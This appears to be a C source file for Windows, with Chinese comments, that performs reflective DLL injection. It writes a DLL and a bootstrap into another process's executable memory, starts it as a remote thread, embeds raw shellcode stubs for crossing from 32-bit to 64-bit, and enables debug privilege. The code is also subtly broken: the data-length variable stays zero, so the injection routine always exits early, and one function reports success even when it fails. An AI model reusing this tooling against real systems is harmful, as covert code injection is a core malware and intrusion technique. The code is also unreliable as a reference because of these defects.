#include "Inject.h"
#include "tchar.h"
LPFN_ISWOW64PROCESS				__IsWow64Process;

static BYTE __ExecutexX64[] =	"\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
								"\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
								"\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
								"\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
								"\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";

static BYTE __FunctionX64[] =	"\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
								"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
								"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
								"\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
								"\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
								"\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
								"\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
								"\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
								"\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
								"\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
								"\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
								"\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
								"\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
								"\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
								"\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
								"\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
								"\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
								"\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
								"\x48\x83\xC4\x50\x48\x89\xFC\xC3";

HANDLE __stdcall LoadRemoteLibrary(HANDLE ProcessHandle, LPVOID FileData, DWORD ViewSize, LPVOID ParameterData, DWORD FunctionHash, LPVOID UserData, DWORD UserDataLength)
{
#if defined(_WIN64)
	DWORD CurrentArchitecture = X64;
#elif defined (_WIN32)
	DWORD CurrentArchitecture = X86;
#else

#endif

	WORD TargetArchitecture;
	DWORD FileDataLength = 0;
	WORD DllArchitecture;
	HANDLE ThreadHandle = NULL;
	__try
	{
		do
		{
			if (!ProcessHandle || !FileData || !FileDataLength)
			{
				break;
			}
			// 获得目标进程的Architecture
			HMODULE ModuleBase = LoadLibrary(_T("kernel32.dll"));
			if (!ModuleBase)
			{
				break;
			}
			__IsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(ModuleBase, "IsWow64Process");
			FreeLibrary(ModuleBase);
			if (__IsWow64Process)
			{
				BOOL IsWow64;
				if (!__IsWow64Process(ProcessHandle, &IsWow64))  //不能判断目标进程的位数
				{
					break;
				}
				if (IsWow64)
					TargetArchitecture = X86;
				else 
				{
					SYSTEM_INFO SystemInfo = { 0 };
					GetNativeSystemInfo(&SystemInfo);
					if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
						TargetArchitecture = X64;
					else if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
						TargetArchitecture = X86;
					else
						break;
				}
			}
			// 获得Dll的Architecture
			PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)(((PUINT8)FileData) + ((PIMAGE_DOS_HEADER)FileData)->e_lfanew);
			if (ImageNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) // PE32
			{
				DllArchitecture = X86;
			}
			else if (ImageNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) // PE64
			{
				DllArchitecture = X64;
			}
			if (DllArchitecture != TargetArchitecture)
			{
				_tprintf(_T("Must Be Same Architecture\r\n"));
				break;
			}

			DWORD ReflectiveLoaderRaw = GetReflectiveLoaderRaw(FileData);
			if (!ReflectiveLoaderRaw)
			{
				_tprintf(_T("Could Not Get ReflectiveLoader Raw\r\n"));
				break;
			}

			DWORD AllDataLength = FileDataLength + UserDataLength + 128; // shellcode buffer
			// alloc memory (RWX) in the host process for the image...
			LPVOID TargetProcessBuffer = VirtualAllocEx(ProcessHandle, NULL, AllDataLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!TargetProcessBuffer)
			{
				break;
			}
			if (!WriteProcessMemory(ProcessHandle, TargetProcessBuffer, FileData, FileDataLength, NULL))
			{
				break;
			}

			ULONG_PTR ReflectiveLoader = (ULONG_PTR)TargetProcessBuffer + ReflectiveLoaderRaw;  //目标进程中的ReflectiveLoader绝对地址
			// write our userdata blob into the host process
			ULONG_PTR UserDataBuffer = (ULONG_PTR)TargetProcessBuffer + FileDataLength;
			if (!WriteProcessMemory(ProcessHandle, (LPVOID)UserDataBuffer, UserData, UserDataLength, NULL))
			{
				break;
			}

			ULONG_PTR ShellCodeBuffer = UserDataBuffer + UserDataLength;
			BYTE BootstrapData[64] = { 0 };   //创建引导程序
			DWORD BootstrapDataLength = CreateBootstrap(BootstrapData, 64, TargetArchitecture, (ULONG_PTR)ParameterData, (ULONG_PTR)TargetProcessBuffer, FunctionHash, UserDataBuffer, UserDataLength, ReflectiveLoader);
			if (BootstrapDataLength <= 0)
			{
				break;
			}

			// finally, write our shellcode into the host process
			if (!WriteProcessMemory(ProcessHandle, (LPVOID)ShellCodeBuffer, BootstrapData, BootstrapDataLength, NULL))
			{
				break;
			}
			FlushInstructionCache(ProcessHandle, TargetProcessBuffer, AllDataLength);

			// 目标64  当前32
			if (CurrentArchitecture == X86 && TargetArchitecture == X64) 
			{
				Wow64CreateRemoteThread(ProcessHandle, (LPVOID)ShellCodeBuffer, ParameterData, &ThreadHandle);
				ResumeThread(ThreadHandle);
			}
			else 
			{
				//Curent -> Target
				//x64		x64
				//x64		x86
				DWORD ThreadIdentify;
				ThreadHandle = CreateRemoteThread(ProcessHandle, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)ShellCodeBuffer, ParameterData, (DWORD)NULL, &ThreadIdentify);
			}

		} while (0);

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		ThreadHandle = NULL;
	}

	return ThreadHandle;
}

DWORD CreateBootstrap(LPBYTE BootstrapData, DWORD BootstrapDataLength, DWORD TargetArchitecture, ULONG_PTR ParameterData, ULONG_PTR BufferData, DWORD FunctionHashValue,
	ULONG_PTR UserData, DWORD UserDataLength, ULONG_PTR ReflectiveLoader)
{
	if (BootstrapDataLength < 64)
		return 0;

#if defined(_WIN64)
	DWORD CurrentArchitecture = X64;
#elif defined(_WIN32)
	DWORD CurrentArchitecture = X86;
#else

#endif
	DWORD i = 0;
	if (TargetArchitecture == X86)
	{
		// push <size of userdata>
		BootstrapData[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(BootstrapData + i, &UserDataLength, sizeof(DWORD));
		i += sizeof(DWORD);

		// push <address of userdata>
		BootstrapData[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(BootstrapData + i, &UserData, sizeof(DWORD));
		i += sizeof(DWORD);

		// push <hash of function>
		BootstrapData[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(BootstrapData + i, &FunctionHashValue, sizeof(DWORD));
		i += sizeof(DWORD);

		// push <address of image base>
		BootstrapData[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(BootstrapData + i, &BufferData, sizeof(DWORD));
		i += sizeof(DWORD);

		// push <lpParameter>
		BootstrapData[i++] = 0x68; // PUSH (word/dword)
		MoveMemory(BootstrapData + i, &ParameterData, sizeof(DWORD));
		i += sizeof(DWORD);

		// mov eax, <address of reflective loader>
		BootstrapData[i++] = 0xB8; // MOV EAX (word/dword)
		MoveMemory(BootstrapData + i, &ReflectiveLoader, sizeof(DWORD));
		i += sizeof(DWORD);

		// call eax
		BootstrapData[i++] = 0xFF; // CALL
		BootstrapData[i++] = 0xD0; // EAX     

	}
	else if (TargetArchitecture == X64)
	{
		if (CurrentArchitecture == X86) {
			// mov rcx, <lpParameter>
			MoveMemory(BootstrapData + i, "\x48\xc7\xc1", 3);
			i += 3;

			MoveMemory(BootstrapData + i, &ParameterData, sizeof(ParameterData));
			i += sizeof(ParameterData);

			// mov rdx, <address of image base>
			MoveMemory(BootstrapData + i, "\x48\xc7\xc2", 3);
			i += 3;

			MoveMemory(BootstrapData + i, &BufferData, sizeof(BufferData));
			i += sizeof(BufferData);

			// mov r8d, <hash of function>
			MoveMemory(BootstrapData + i, "\x41\xb8", 2);
			i += 2;

			MoveMemory(BootstrapData + i, &FunctionHashValue, sizeof(FunctionHashValue));
			i += sizeof(FunctionHashValue);

			// mov r9, <address of userdata>
			MoveMemory(BootstrapData + i, "\x49\xc7\xc1", 3);
			i += 3;

			MoveMemory(BootstrapData + i, &UserData, sizeof(UserData));
			i += sizeof(UserData);

			// push <size of userdata>
			BootstrapData[i++] = 0x68; // PUSH (word/dword)
			MoveMemory(BootstrapData + i, &UserDataLength, sizeof(UserDataLength));
			i += sizeof(UserDataLength);

			// sub rsp, 20
			MoveMemory(BootstrapData + i, "\x48\x83\xec\x20", 4);  //
			i += 4;

			// move rax, <address of reflective loader>
			MoveMemory(BootstrapData + i, "\x48\xc7\xc0", 3);
			i += 3;

			MoveMemory(BootstrapData + i, &ReflectiveLoader, sizeof(ReflectiveLoader));
			i += sizeof(ReflectiveLoader);

		}
		else 
		{
			// mov rcx, <lpParameter>
			MoveMemory(BootstrapData + i, "\x48\xb9", 2);
			i += 2;

			MoveMemory(BootstrapData + i, &ParameterData, sizeof(ParameterData));
			i += sizeof(ParameterData);

			// mov rdx, <address of image base>
			MoveMemory(BootstrapData + i, "\x48\xba", 2);
			i += 2;

			MoveMemory(BootstrapData + i, &BufferData, sizeof(BufferData));
			i += sizeof(BufferData);

			// mov r8d, <hash of function>
			MoveMemory(BootstrapData + i, "\x41\xb8", 2);
			i += 2;

			MoveMemory(BootstrapData + i, &FunctionHashValue, sizeof(FunctionHashValue));
			i += sizeof(FunctionHashValue);

			// mov r9, <address of userdata>
			MoveMemory(BootstrapData + i, "\x49\xb9", 2);
			i += 2;

			MoveMemory(BootstrapData + i, &UserData, sizeof(UserData));
			i += sizeof(UserData);

			// push <size of userdata>
			BootstrapData[i++] = 0x68; // PUSH (word/dword)
			MoveMemory(BootstrapData + i, &UserDataLength, sizeof(UserDataLength));
			i += sizeof(UserDataLength);

			// sub rsp, 20
			MoveMemory(BootstrapData + i, "\x48\x83\xec\x20", 4);
			i += 4;

			// move rax, <address of reflective loader>
			MoveMemory(BootstrapData + i, "\x48\xb8", 2);
			i += 2;

			MoveMemory(BootstrapData + i, &ReflectiveLoader, sizeof(ReflectiveLoader));
			i += sizeof(ReflectiveLoader);
		}

		// call rax
		BootstrapData[i++] = 0xFF; // CALL
		BootstrapData[i++] = 0xD0; // RAX
	}

	return i;
}

BOOL EnableDebugPrivilege(IN const TCHAR* PriviledgeName, BOOL IsEnable)
{
	// 打开权限令牌
	HANDLE  ProcessHandle = GetCurrentProcess();
	HANDLE  TokenHandle = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
	if (!OpenProcessToken(ProcessHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle))
	{
		return FALSE;
	}
	LUID Luid;
	if (!LookupPrivilegeValue(NULL, PriviledgeName, &Luid))// 通过权限名称查找uID
	{
		CloseHandle(TokenHandle);
		TokenHandle = NULL;
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;		// 要提升的权限个数
	TokenPrivileges.Privileges[0].Attributes = IsEnable == TRUE ? SE_PRIVILEGE_ENABLED : 0;    // 动态数组，数组大小根据Count的数目
	TokenPrivileges.Privileges[0].Luid = Luid;

	if (!AdjustTokenPrivileges(TokenHandle, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		_tprintf(_T("%d\r\n"), GetLastError());
		CloseHandle(TokenHandle);
		TokenHandle = NULL;
		return FALSE;
	}
	CloseHandle(TokenHandle);
	TokenHandle = NULL;
	return TRUE;
}

DWORD GetReflectiveLoaderRaw(VOID* VirtualAddress)
{
	ULONG_PTR BaseAddress = (ULONG_PTR)VirtualAddress;
	PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)(BaseAddress + ((PIMAGE_DOS_HEADER)VirtualAddress)->e_lfanew);
	ULONG_PTR ImageDataDirectory;
	if (ImageNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) // PE32
	{
		ImageDataDirectory = (UINT_PTR) & ((PIMAGE_NT_HEADERS32)ImageNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	}
	else if (ImageNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) // PE64
	{
		ImageDataDirectory = (UINT_PTR) & ((PIMAGE_NT_HEADERS64)ImageNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	}
	else
	{
		return 0;
	}

	ULONG_PTR ImageExportDirectory = BaseAddress + RvaToRaw(((PIMAGE_DATA_DIRECTORY)ImageDataDirectory)->VirtualAddress, BaseAddress);   //FileOffset
	ULONG_PTR AddressOfNames = BaseAddress + RvaToRaw(((PIMAGE_EXPORT_DIRECTORY)ImageExportDirectory)->AddressOfNames, BaseAddress);
	ULONG_PTR AddressOfFunctions = BaseAddress + RvaToRaw(((PIMAGE_EXPORT_DIRECTORY)ImageExportDirectory)->AddressOfFunctions, BaseAddress);
	ULONG_PTR AddressOfNameOrdinals = BaseAddress + RvaToRaw(((PIMAGE_EXPORT_DIRECTORY)ImageExportDirectory)->AddressOfNameOrdinals, BaseAddress);
	DWORD NumberOfNames = ((PIMAGE_EXPORT_DIRECTORY)ImageExportDirectory)->NumberOfNames;
	while (NumberOfNames--)
	{
		char* FunctionName = (char*)(BaseAddress + RvaToRaw(DEREFERENCE_32(AddressOfNames), BaseAddress));   //RVA

		if (strstr(FunctionName, "ReflectiveLoader") != NULL)
		{
			AddressOfFunctions = BaseAddress + RvaToRaw(((PIMAGE_EXPORT_DIRECTORY)ImageExportDirectory)->AddressOfFunctions, BaseAddress);
			AddressOfFunctions += (DEREFERENCE_16(AddressOfNameOrdinals) * sizeof(DWORD));
			return RvaToRaw(DEREFERENCE_32(AddressOfFunctions), BaseAddress);
		}
		AddressOfNames += sizeof(DWORD);
		AddressOfNameOrdinals += sizeof(WORD);
	}
	return 0;
}

DWORD RvaToRaw(DWORD Rva, UINT_PTR ImageBase)
{
	PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)(ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
	PIMAGE_SECTION_HEADER ImageSectionHeader;
	ULONG NumberOfSections;
	if (ImageNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) // PE32
	{
		PIMAGE_NT_HEADERS32 ImageNtHeaders32 = (PIMAGE_NT_HEADERS32)ImageNtHeaders;
		ImageSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&ImageNtHeaders32->OptionalHeader) + ImageNtHeaders32->FileHeader.SizeOfOptionalHeader);
		NumberOfSections = ImageNtHeaders32->FileHeader.NumberOfSections;
	}
	else if (ImageNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) // PE64
	{
		PIMAGE_NT_HEADERS64 ImageNtHeaders64 = (PIMAGE_NT_HEADERS64)ImageNtHeaders;
		ImageSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&ImageNtHeaders64->OptionalHeader) + ImageNtHeaders64->FileHeader.SizeOfOptionalHeader);
		NumberOfSections = ImageNtHeaders64->FileHeader.NumberOfSections;
	}
	else
	{
		return 0;
	}

	if (Rva < ImageSectionHeader[0].PointerToRawData)  //如果RVA属于头部信息
	{
		return Rva;
	}

	for (int i = 0; i < NumberOfSections; i++)//RVA 属于节
	{
		if (Rva >= ImageSectionHeader[i].VirtualAddress && Rva < (ImageSectionHeader[i].VirtualAddress + ImageSectionHeader[i].SizeOfRawData))
		{
			return (Rva - ImageSectionHeader[i].VirtualAddress + ImageSectionHeader[i].PointerToRawData);
		}
	}
	return 0;
}

BOOL Wow64CreateRemoteThread(HANDLE ProcessHandle, LPVOID ThreadProcedure, LPVOID ParameterData, HANDLE* ThreadHandle)
{
	BOOL IsOk = TRUE;
	OSVERSIONINFO OsVersionInfo;
	LPFN_EXECUTEX64 ExecuteX64 = NULL;
	LPFN_FUNCTIONX64 FunctionX64 = NULL;
	do
	{
		OsVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if (!GetVersionEx(&OsVersionInfo))
			
		{
			_tprintf(_T("GetVersionEx() Error\r\n"));
			break;
		}
		// filter out Windows 2003
		if (OsVersionInfo.dwMajorVersion == 5 && OsVersionInfo.dwMinorVersion == 2)
		{
			_tprintf(_T("Is 2003 Error\r\n"));
			break;
		}
		ExecuteX64 = (LPFN_EXECUTEX64)VirtualAlloc(NULL, sizeof(__ExecutexX64), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!ExecuteX64)
		{
			_tprintf(_T("VirtualAlloc() Error\r\n"));
			break;
		}
		FunctionX64 = (LPFN_FUNCTIONX64)VirtualAlloc(NULL, sizeof(__FunctionX64) + sizeof(WOW64CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!FunctionX64)
		{
			_tprintf(_T("VirtualAlloc() Error\r\n"));
			break;
		}
		// copy over the wow64->x64 stub
		memcpy(ExecuteX64, &__ExecutexX64, sizeof(__ExecutexX64));
		// copy over the native x64 function
		memcpy(FunctionX64, &__FunctionX64, sizeof(__FunctionX64));
		// set the context
		WOW64CONTEXT* Wow64Context = (WOW64CONTEXT*)((BYTE*)FunctionX64 + sizeof(__FunctionX64));
		Wow64Context->u1.ProcessHandle = ProcessHandle;   //目标进程句柄
		Wow64Context->u2.ThreadProcedure = ThreadProcedure;
		Wow64Context->u3.ParameterData = ParameterData;
		Wow64Context->u4.ThreadHandle = NULL;
		//执行该代码的环境是32位
		if (!ExecuteX64(FunctionX64, (DWORD)Wow64Context))
		{
			_tprintf(_T("ExecuteX64() Error\r\n"));
			break;
		}

		if (!Wow64Context->u4.ThreadHandle)
		{
			_tprintf(_T("ThreadHandle Is NULL\r\n"));
			break;
		}
		// Success! grab the new thread handle from of the context
		*ThreadHandle = Wow64Context->u4.ThreadHandle;
	} while (0);

	if (ExecuteX64)
	{
		VirtualFree(ExecuteX64, 0, MEM_RELEASE);
		ExecuteX64 = NULL;
	}

	if (FunctionX64)
	{
		VirtualFree(FunctionX64, 0, MEM_RELEASE);
		FunctionX64 = NULL;
	}
	return IsOk;
}
